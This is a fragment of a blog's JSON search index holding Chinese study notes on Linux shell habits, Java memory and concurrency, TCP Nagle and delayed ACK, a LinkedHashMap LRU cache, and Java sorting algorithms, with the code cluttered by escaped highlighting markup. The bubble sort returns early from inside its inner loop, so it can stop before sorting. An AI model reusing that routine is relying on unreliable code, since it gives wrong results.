Dec 的所有文件。因此，诸如 December_Report.pdf 等文件是匹配的，即使它自从一月份以来还未修改过。这可能不是您希望的结果。为了匹配特定字段中的模式，最好使用 awk，其中的一个关系运算符对确切的字段进行匹配，如以下示例所示： 清单 20. 好习惯 9 的示例：使用 awk 来查找特定字段中的模式 ~/tmp $ ls -l | awk '$6 == &quot;Dec&quot;' -rw-r--r-- 3 joe joe 5096 Dec 14 14:26 archive.tar -rw-r--r-- 1 root root 238 Dec 03 08:19 README ~/tmp $ 停止对 cat 使用管道 grep 的一个常见的基本用法错误是通过管道将 cat 的输出发送到 grep 以搜索单个文件的内容。这绝对是不必要的，纯粹是浪费时间，因为诸如 grep 这样的工具接受文件名作为参数。您根本不需要在这种情况下使用 cat ~ $ time cat tmp/a/longfile.txt | grep and 2811 real 0m0.015s user 0m0.003s sys  0m0.013s ~ $ time grep and tmp/a/longfile.txt 2811 real 0m0.010s user 0m0.006s sys  0m0.004s ~ $ ",
      "url"      : "http://localhost:4000/2017/04/04/linux-best-practise/"
    } ,
  
    {
      "title"    : "Java学习笔记",
      "category" : "diary",
      "content": "Java多处理器多线程伪共享 没有竞争的类对象分配到同一个cacheline，造成不必要的内存竞争。 ConcurrentHashMap分段锁 Segment[] HashEntry[] -&gt; HashEntry Java内存映射文件 内存映射文件特别适合于对大文件的操作(读写时间短)，JAVA中的限制是最大不得超过 Integer.MAX_VALUE，即2G左右 内存映射文件属于JVM中的直接缓冲区（属于JVM堆外内存），不受JVM堆内存大小的限制。 内存映射文件的区域并不在JVM GC的回收范围内，因为它本身就不属于堆区，卸载这部分区域只能通过系统调用 unmap()来实现 (Linux)中，而 JAVA API 只提供了 FileChannel.map 的形式创建内存映射区域，却没有提供对应的 unmap()，要卸载这部分区域比较麻烦。 Java内存映射文件跟ByteBuffer.allocateDirect还不太一样。 Java Direct Memory 直接内存DirectMemory的大小默认为 -Xmx 的JVM堆的最大值，但是并不受其限制，而是由JVM参数 MaxDirectMemorySize单独控制。 DirectMemory的内存只有在 JVM执行 full gc 的时候才会被回收，那么如果在其上分配过大的内存空间，那么也将出现 OutofMemoryError，即便 JVM 堆中的很多内存处于空闲状态。 ",
      "url"      : "http://localhost:4000/2017/04/08/diary/"
    } ,
  
    {
      "title"    : "网络学习笔记",
      "category" : "diary",
      "content": "网络 Nagle算法 简单的说是把较小的包组装为更大的包延迟发送 Nagle’s Algorithm 是为了提高带宽利用率设计的算法，其做法是合并小的TCP 包为一个，避免了过多的小报文的 TCP 头所浪费的带宽。如果开启了这个算法 （默认），则协议栈会累积数据直到以下两个条件之一满足的时候才真正发送出去： 积累的数据量到达最大的 TCP Segment Size 收到了一个 Ack Nagle算法的初衷：避免发送大量的小包，防止小包泛滥于网络，理想情况下，对于一个TCP连接而言，网络上每次只能一个小包存在。 ACK延迟确认 延迟 Ack 包的发送，使得协议栈有机会合并多个 Ack，提高网络性能。 如果一个 TCP 连接的一端启用了 Nagle‘s Algorithm，而另一端启用了 TCP Delayed Ack，而发送的数据包又比较小，则可能会出现这样的情况：发送端在等待接收端对上一个packet的 Ack 才发送当前的 packet，而接收端则正好延迟了此 Ack 的发送，那么这个正要被发送的 packet 就会同样被延迟。当然 Delayed Ack 是有个超时机制的，而默认的超时是 40ms。 现代的 TCP/IP 协议栈实现，默认几乎都启用了这两个功能，协议的交互是发送端连续发送两个 packet，然后立刻 read 的时候会出现上面问题。 TCP_NODELAY 通过设置套接字的TCP_NODELAY选项禁用Nagle算法，立即发送 参考：http://www.secbox.cn/hacker/5998.html TCP_CORK CORK算法的初衷：提高网络利用率，理想情况下，完全避免发送小包，仅仅发送满包以及不得不发的小包 CORK选项提高了网络的利用率，因为它直接禁止了小包的发送(强调一下，Nagle算法没有禁止小包发送，只是禁止了大量小包的发送) HTTP长连接／短连接／pipeline连接 ",
      "url"      : "http://localhost:4000/2017/04/08/diary-network/"
    } ,
  
    {
      "title"    : "JAVA LRU",
      "category" : "diary",
      "content": "LRU(Least Recently Used) LinkedHashMap LinkedHashMap自身已经实现了顺序存储，默认情况下是按照元素的添加顺序存储，也可以启用按照访问顺序存储，即最近读取的数据放在最前面，最早读取的数据放在最后面。 LinkedHashMap有一个判断是否删除最老数据的方法，默认是返回false，即不删除数据 //LinkedHashMap的一个构造函数，当参数accessOrder为true时，即会按照访问顺序排序， //最近访问的放在最前，最早访问的放在后面 public LinkedHashMap(int initialCapacity, float loadFactor, boolean accessOrder) {  super(initialCapacity, loadFactor);  this.accessOrder = accessOrder; } //LinkedHashMap自带的判断是否删除最老的元素方法，默认返回false，即不删除老数据 //我们要做的就是重写这个方法，当满足一定条件时删除老数据 protected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; eldest) { return false; } FIFO实现 final int cacheSize = 5; LinkedHashMap&lt;Integer, String&gt; lru = new LinkedHashMap&lt;Integer, String&gt;() {  @Override  protected boolean removeEldestEntry(Map.Entry&lt;Integer, String&gt; eldest) {  return size() &gt; cacheSize;  } }; LRU实现 package cn.lzrabbit.structure.lru; import java.util.LinkedHashMap; import java.util.Map; /** Created by liuzhao on 14-5-15. */ public class LRUCache2&lt;K, V&gt; extends LinkedHashMap&lt;K, V&gt; { private final int MAX_CACHE_SIZE; public LRUCache2(int cacheSize) { super((int) Math.ceil(cacheSize / 0.75) + 1, 0.75f, true); MAX_CACHE_SIZE = cacheSize; } @Override protected boolean removeEldestEntry(Map.Entry eldest) { return size() &gt; MAX_CACHE_SIZE; } @Override public String toString() { StringBuilder sb = new StringBuilder(); for (Map.Entry&lt;K, V&gt; entry : entrySet()) { sb.append(String.format(&quot;%s:%s &quot;, entry.getKey(), entry.getValue())); } return sb.toString(); } } 参考 http://www.cnblogs.com/lzrabbit/p/3734850.html ",
      "url"      : "http://localhost:4000/2017/04/09/java-lru/"
    } ,
  
    {
      "title"    : "JAVA排序算法",
      "category" : "sort",
      "content": "Java排序算法 1.插入排序 稳定 原理：从有序序列中选择合适的位置进行插入 复杂度：最好 - 最坏 - 平均 O(n) - O(n^2) - O(n^2) public void insertSort(int[] a) {  tif (null ==a || a.length &lt; 2) {  t treturn;  t}  tfor (int i = 1; i &lt; a.length; i++) {  t tint temp = a[i]; // 暂存  t tint j = i - 1;  t twhile (j &gt;= 0 &amp;&amp; temp &lt; a[j]) {  t t ta[j+1] = a[j];  t t tj--;  t t}  t ta[j+1] = temp;  t} } 2.冒泡排序 稳定 原理：相邻两个元素比较大小进行交换，一趟冒泡后会有一个元素到达最终位置 复杂度：最好 - 最坏 - 平均 O(n) - O(n^2) - O(n^2) public void bubbleSort(int[] a) {  tif (null == a || a.length &lt; 2) {  t treturn;  t}  tboolean flag;  tfor (int i = 0; i &lt; a.length - 1; i++) {  t tflag = false;  t tfor (int j = 0; j &lt; a.length - 1 - i; j++) {  t t tif (a[j] &gt; a[j+1]) {  t t t tint temp = a[j];  t t t ta[j] = a[j+1];  t t t ta[j+1] = temp;  t t t tflag = true;  t t t}  t t tif (flag == false) {  t t t treturn;  t t t}  t t}  t} } 3.希尔排序(缩小增量排序) 不稳定 按步长进行分组，组内直接插入，缩小增量再次进行此步骤，增量为1时相当于一次直接插入。 复杂度：最好O(n) - 最坏O(n^s 1&lt;s&lt;2) - 平均O(n^1.3) public void shellSort(int[] a) {  tif (null == a || a.length &lt; 2) {  t treturn;  t}  tfor (int d = a.length/2; d &gt; 0; d/=2) {  t tfor (int i = d; i &lt; a.length; i++) {  t t// 内部直接插入  t t tint temp = a[i];  t t tint j = i - d;  t t twhile (j &gt;= 0 &amp;&amp; temp &lt; a[j]) {  t t t ta[j+d] = a[j];  t t t tj -= d;  t t t}  t t ta[j+d] = temp;  t t} t  t} } 4.选择排序 不稳定 原理：每次从无序序列选择一个最小的 复杂度：最好O(n^2) - 最坏O(n^2) - 平均O(n^2) public void selectSort(int[] a) {  tif (null == a || a.length &lt; 2) {  t treturn;  t} &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 5.快速排序 不稳定 原理：分治+递归 复杂度：最好O(nlgn) - 最坏O(n^2) - 平均O(nlgn) public void quickSort(int[] a, int low, int high) { &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;partition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;quickSort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;quickSort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } private int partition(int[] a, int low, int high) { int pivot = a[low]; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--;&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++;&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; } 选取pivot的方式：固定基准元 随机基准 三数取中 快排的优化：针对随机数组+有序数组+重复数组 1.当待排序序列的长度分割到一定大小后，使用插入排序&lt;三数取中+插入排序&gt;：效率提高一些，但是都解决不了重复数组的问题。 2.在一次分割结束后，可以把与Key相等的元素聚在一起，继续下次分割时，不用再对与key相等元素分割 &lt;三数取中+插排+聚集相同元素&gt; 6.归并排序 稳定 原理：两个有序序列的合并，方法：分治 + 递归 复杂度：最好O(nlgn) - 最坏O(nlgn) - 平均O(nlgn) public void mergeSort(int[] a, int low, int high) {  tint mid = (low + high) / 2;  tif (low &lt; high) {  t t//左边  t tmergeSort(a, low, mid);  t t//右边  t tmergeSort(a, mid + 1, high);  t t//有序序列归并  t tmerge(a, low, mid, high);  t} } private void merge(int[] a, int low, int mid, int high) { int[] temp = new int[high - low + 1]; // 左指针 int i = low; // 右指针 int j = mid + 1; // 临时数组指针 int k = 0; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++];&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++];&lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//左边剩余&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++];&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//右边剩余&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;high&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++];&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 倒出&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;low&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 7. 堆排序 原理：利用堆的特性 复杂度：O(nlogn) [平均 - 最好 - 最坏] // 堆排序 public void heapSort(int[] a) {  tif (null == a || a.length &lt; 2) {  t treturn;  t}  tbuildMaxHeap(a); &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span 